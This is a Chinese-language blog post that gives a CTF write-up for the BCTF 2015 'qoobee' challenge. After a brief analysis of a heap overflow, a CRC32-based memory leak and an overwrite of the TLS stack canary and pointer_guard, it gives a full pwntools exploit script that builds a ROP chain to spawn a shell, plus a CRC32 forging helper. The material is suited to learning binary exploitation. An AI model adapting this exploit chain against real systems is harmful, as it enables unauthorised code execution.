---  
layout: post  
title: "bctf_qoobee"  
date: 2015-10-13 21:43:06 +0800  
comments: true  
categories:   
---  
###0x00 程序分析  
程序有明显的堆溢出，和一个未被调用的栈溢出函数  
功能3可以泄漏任意地址的内容  
先malloc0x21000在tls前，溢出canary_guard和pointer_guard，把pointer_guard改成0x400d79^一个值  
使用功能2时会进入0x400d79，rop得到shell  
  
###0x01 exp  
  
	from pwn import *  
	import crc32  
  
	if len(sys.argv)>1:  
	  r = remote(sys.argv[1], 1002)  
	else:  
	  #r = remote('127.0.0.1', 8888)  
	   r = process('./qoobee')  
	def leak_crc32(addr):  
	  r.recvuntil('# ')  
	  r.send('1\n')  
	  r.recvuntil('How many dounts you want? ')  
	  r.send('x'*2040 + p64(addr) + 'aaaaaaaa\n')  
	  r.recvuntil('# ')  
	  r.send('3\n')  
	  r.recvuntil('Input your local system timestamp: ')  
	  r.send('aaa\n')  
	  r.recvuntil('Response: ')  
	  x = int(r.recvuntil('\n')[:-1], 16)  
	  return x  
  
	def leak(leak_buf, addr, n):  
	  addr -= 8  
	  s = ''  
	  for i in range(0, n, 4):  
	    r.recvuntil('# ')  
	    r.send('1\n')  
	    r.recvuntil('How many dounts you want? ')  
	    r.send('x'*2040 + p64(addr+i) + 'aaaaaaaa\n')  
	    r.recvuntil('# ')  
	    r.send('3\n')  
	    r.recvuntil('Input your local system timestamp: ')  
	    r.send('aaa\n')  
	    r.recvuntil('Response: ')  
	    x = int(r.recvuntil('\n')[:-1], 16)  
	    x = crc32.forge(x, leak_buf)[-4:]  
	    s += x  
	    leak_buf = (leak_buf + x)[-8:]  
	  return s[:n]  
  
	log.info('payload 1')  
	raw_input()  
	libz_base = u64(leak(p64(0x400bd6), 0x00007ffff7bc5000, 8))  
	#libz_base = u64(leak(p64(0x400bd6), 0x6020a0, 8)) - 0x2740  
	log.info('done')  
	print 'libz_base = %x' % libz_base  
	magic = crc32.crc32(unhex('7f454c460201010000000000'))  
  
	libc_base = libz_base - 0x6c9000  
	log.info('payload 2')  
	raw_input()  
	ss = leak('\x00'*8, libz_base + 0x4317a0, 24)  
	log.info('done')  
	stackguard = u64(ss[8:16])  
	pointerguard = u64(ss[16:24])  
  
	payload = [0]*38  
	payload[4] = libz_base - 0x309fa0  
	payload[5] = libz_base - 0x305c20  
	payload[8] = libz_base - 0x561380  
	payload[10] = libz_base - 0x561980  
	payload[12] = libz_base - 0x560a80  
	payload[30] = libz_base + 0x431780  
	payload[31] = libz_base + 0x432090  
	payload[32] = libz_base + 0x431780  
	payload[35] = stackguard  
	payload[36] = 0x69ea000000000020 ^ 0x400d79  
	payload = ''.join(map(p64, payload))  
  
	r.recvuntil('# ')  
	r.send('1\n')  
	r.recvuntil('How many dounts you want? ')  
	r.send(str(0x22100) + '\n')		#middle malloc  
	r.recvuntil('Remark: ')  
	log.info('payload 3')  
	raw_input()  
	r.send('A'*(0x24690-16) + payload + '\n')  
	log.info('done')  
  
	r.recvuntil('# ')  
	r.send('2\n')  
	r.recvuntil('Now you can leave me a message: ')  
  
	pop_rdi_ret = 0x401503  
	gets = libc_base + 0x6f440  
	system = libc_base + 0x46640  
  
	log.info('payload 4')  
	raw_input()  
	r.send(p64(stackguard)*33 + (  
	  p64(pop_rdi_ret) + p64(libc_base + 0x17ccdb) + p64(system)   
	  ) + '\n')  
	log.info('done')  
  
	r.interactive()  
	r.close()  
  
crc32  
  
	from struct import pack,unpack  
	import binascii  
  
	# Poly in "reversed" notation -- http://en.wikipedia.org/wiki/Cyclic_redundancy_check  
	POLY = 0xedb88320 # CRC-32-IEEE 802.3  
	#POLY = 0x82F63B78 # CRC-32C (Castagnoli)  
	#POLY = 0xEB31D82E # CRC-32K (Koopman)  
	#POLY = 0xD5828281 # CRC-32Q  
  
	def build_crc_tables():  
	    for i in range(256):  
		fwd = i  
		rev = i << 24  
		for j in range(8, 0, -1):  
		    # build normal table  
		    if (fwd & 1) == 1:  
			fwd = (fwd >> 1) ^ POLY  
		    else:  
			fwd >>= 1  
		    crc32_table[i] = fwd & 0xffffffff  
		    # build reverse table =)  
		    if rev & 0x80000000 == 0x80000000:  
			rev = ((rev ^ POLY) << 1) | 1  
		    else:  
			rev <<= 1  
		    rev &= 0xffffffff  
		    crc32_reverse[i] = rev  
  
	crc32_table, crc32_reverse = [0]*256, [0]*256  
	build_crc_tables()  
  
  
	def crc32(s): # same crc32 as in (binascii.crc32)&0xffffffff  
	  crc = 0xffffffff  
	  for c in s:  
	    crc = (crc >> 8) ^ crc32_table[(crc ^ ord(c)) & 0xff]  
	  return crc ^0xffffffff  
  
  
  
	def forge(wanted_crc, str, pos=None):  
	  if pos is None:  
	    pos = len(str)  
  
	  # forward calculation of CRC up to pos, sets current forward CRC state  
	  fwd_crc = 0xffffffff # <<<< PATCHED!  
	  for c in str[:pos]:  
	    fwd_crc = (fwd_crc >> 8) ^ crc32_table[(fwd_crc ^ ord(c)) & 0xff]  
  
	  # backward calculation of CRC up to pos, sets wanted backward CRC state  
	  bkd_crc = wanted_crc ^0xffffffff # <<<< PATCHED!  
	  for c in str[pos:][::-1]:  
	    bkd_crc = ((bkd_crc << 8)&0xffffffff) ^ crc32_reverse[bkd_crc >> 24] ^ ord(c)  
  
	  # deduce the 4 bytes we need to insert  
	  for c in pack('<L',fwd_crc)[::-1]:  
	    bkd_crc = ((bkd_crc << 8)&0xffffffff) ^ crc32_reverse[bkd_crc >> 24] ^ ord(c)  
  
	  res = str[:pos] + pack('<L', bkd_crc) + str[pos:]  
	  assert(crc32(res) == wanted_crc)  
	  return res  
  
  
###0x02 misc  
  
gdb 查找  
find  
